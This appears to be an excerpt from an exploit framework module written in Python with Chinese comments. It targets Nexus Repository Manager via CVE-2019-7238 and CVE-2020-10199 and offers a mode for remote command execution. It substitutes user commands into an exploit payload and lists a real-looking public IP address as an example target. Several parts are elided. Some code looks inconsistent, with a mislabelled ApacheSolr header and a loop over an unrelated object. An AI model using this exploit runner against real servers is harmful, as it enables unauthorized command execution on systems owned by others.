...
################
##--ApacheSolr--##
#cve_2019_7238   Nexus版本确认
#cve_2020_10199 需要账号密码
################
#VULN = None => 漏洞测试
#VULN = True => 命令执行
VULN = ''
...
class Nexus():
    ...
    def cve_2019_7238(self):
        ...
        self.payload = self.payload_cve_2019_7238.replace("RECOMMAND",self.CMD)
        self.method = "post"
        self.rawdata = "null"
...
print("""eg: http://50.249.252.117/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Nexus OSS/Pro     | cve_2019_7238    |  Y  |  Y  | 3.6.2 - 3.14.0, remote code execution vulnerability         |
| Nexus OSS/Pro     | cve_2020_10199   |  Y  |  Y  | 3.x <= 3.21.1, remote code execution vulnerability          |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    global VULN,TIMEOUT
    VULN = kwargs['vuln']
    ...
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpNexus, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(_urlparse):
            if not func.startswith("__"):
                methodcaller(func)(ExpNexus)
